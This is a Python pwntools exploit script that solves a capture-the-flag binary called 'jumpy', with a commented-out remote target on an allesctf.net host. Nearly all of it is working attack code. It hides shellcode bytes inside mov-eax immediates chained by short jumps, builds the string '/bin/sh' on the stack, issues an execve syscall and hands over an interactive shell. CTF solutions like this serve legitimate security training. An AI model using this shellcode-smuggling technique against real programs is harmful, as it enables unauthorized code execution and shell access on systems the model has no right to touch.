from pwn import *
io = process("./jumpy")
#io = remote("(id).jumpy.challenge.master.allesctf.net",31337,ssl=True)
io.recvuntil(">")

def movEax(movArg):
    io.sendline("moveax")
    io.sendline(str(movArg))
    io.recvuntil(">")

def jmp(jmpNum):
    io.sendline("jmp")
    io.sendline(str(jmpNum))
    io.recvuntil(">")
    
def ret():
    io.sendline("ret")
    io.recvuntil(">")

#used to chain instructions, maximum 4 bytes
def execute(instruction): 
    jmp(1)
    movEax(u32(b"\xeb\x03".ljust(4,b"\x00"))) #jmp 3
    movEax(u32(instruction.ljust(4,b"\x90")))

#Setup Shellcode (dk why some pwntools asm give errors)
#Setup /bin/sh 0x68732f6e69622f
movEax(0x6e69622f)
execute(b"\x50")                #push rax
execute(b"\x48\x89\xE7")        #mov rdi,rsp  (mov BYTE PTR[rsp],0x1 takes 5 bytes,but rdi takes 3 bytes)
execute(b"\x48\x83\xC7\x04")    #add rdi,4       
execute(b"\xC6\x07\x2f")        #mov BYTE PTR[rdi],0x2f
execute(b"\x48\x83\xC7\x01")    #add rdi,1         
execute(b"\xC6\x07\x73")        #mov BYTE PTR[rdi],0x73
execute(b"\x48\x83\xC7\x01")    #add rdi,1
execute(b"\xC6\x07\x68")        #mov BYTE PTR[rdi],0x68

#Syscall execve with /bin/sh
movEax(0x3b) #execve syscall num
execute(b"\x48\x89\xE7")        #mov rdi,rsp  
execute(b"\x6A\x00")            #push 0
execute(b"\x5E")                #pop rsi
execute(b"\x0F\x05")            #syscall

#execute code
io.sendline("A")
io.recvuntil("running your code...")
io.interactive()

